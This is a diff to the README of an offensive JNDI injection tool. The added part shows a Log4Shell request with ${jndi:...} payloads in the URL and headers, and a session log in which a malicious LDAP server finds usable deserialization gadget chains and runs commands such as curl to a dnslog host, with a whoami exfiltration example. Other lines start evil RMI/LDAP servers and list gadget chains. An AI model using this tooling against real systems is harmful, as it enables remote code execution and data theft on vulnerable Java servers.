@@ -33,6 +33,72 @@ java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.
 
 
 
+新增的 jndi.LDAPRefServerAuto 示例
+> cat request1.txt
+GET /${jndi:__JNDI__} HTTP/1.1
+Host: xx.xx.xx.xx
+Accept: \${jndi:__JNDI__}
+
+> java -cp jndi_tool.jar jndi.LDAPRefServerAuto xx.xx.xx.xx 1099 80 file=request1.txt
+
+or
+
+> java -cp jndi_tool.jar jndi.LDAPRefServerAuto xx.xx.xx.xx 1099 80 url="http://xx.xx.xx/\${jndi:__JNDI__}"  headers="Accept: \${jndi:__JNDI__}"
+[-] url: http://xx.xx.xx/${jndi:__JNDI__}
+[-] process headers: {Accept=${jndi:__JNDI__}}
+[-] use: ldap://xx.xx.xx:1099/JNDIObject
+[-] url: http://xx.xx.xx/${jndi:ldap://xx.xx.xx:1099/JNDIObject}
+[-] LDAP Listening on xx.xx.xx:1099
+[-] get request delay time, waiting...
+[-] use waiting time: 1000
+[-] checking CommonsBeanutils2
+[-] checking CommonsCollections8
+[-] checking CommonsCollections10
+[-] checking CommonsCollectionsK1
+[-] checking CommonsCollectionsK2
+[-] checking CommonsCollectionsK3
+[-] checking CommonsCollectionsK4
+[-] checking CommonsBeanutils1
+[*] find: CommonsBeanutils1 can be use
+[-] checking CommonsCollections1
+[-] checking CommonsCollections2
+[-] checking CommonsCollections3
+[-] checking CommonsCollections5
+[-] checking CommonsCollections6
+[-] checking CommonsCollections7
+[-] checking CommonsCollections9
+[-] checking Groovy1
+[-] checking JSON1
+[*] find: JSON1 can be use
+[-] checking Jdk7u21
+[-] checking Spring1
+[-] checking Spring2
+[-] checking el
+waiting ...
+retrying ...
+[*] find: el can be use
+0. CommonsBeanutils1
+1. JSON1
+2. el
+[-] please choose gadget, enter q or quit to quit,
+> 0
+* example: curl x.xx , bash=curl `whoami`.x.xx
+[-] please enter command, enter q or quit to quit,
+> curl x.dnslog
+[-] please enter command, enter q or quit to quit,
+> back
+0. CommonsBeanutils1
+1. JSON1
+2. el
+[-] please choose gadget, enter q or quit to quit,
+> 2
+* example: curl x.xx , bash=curl `whoami`.x.xx
+[-] please enter command, enter q or quit to quit,
+> curl x.dnslog
+[-] please enter command, enter q or quit to quit,
+> q                                  
+
+
 
 
 
@@ -267,32 +333,6 @@ java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 java -cp jndi_tool.jar jndi.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 /
 java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
-
-
-3. LDAP2
-java -cp fastjson_tool.jar jndi.fastjson.LDAPRefServer 1099
-CommonsBeanutils1  
-CommonsCollections1
-CommonsCollections2
-CommonsCollections3
-CommonsCollections4
-CommonsCollections5
-CommonsCollections6
-CommonsCollections7
-CommonsCollections8
-CommonsCollections9
-CommonsCollections10                                                                                                                                                          
-CommonsCollectionsK1                                                                                                                                                             
-CommonsCollectionsK2                                                                                                                                                             
-CommonsCollectionsK3                                                                                                                                                             
-CommonsCollectionsK4
-Groovy1            
-URLDNS             
-JSON1              
-Spring1            
-Spring2            
-file   （BASE64编码后的反序列内容文件）
-
 
 ```
 
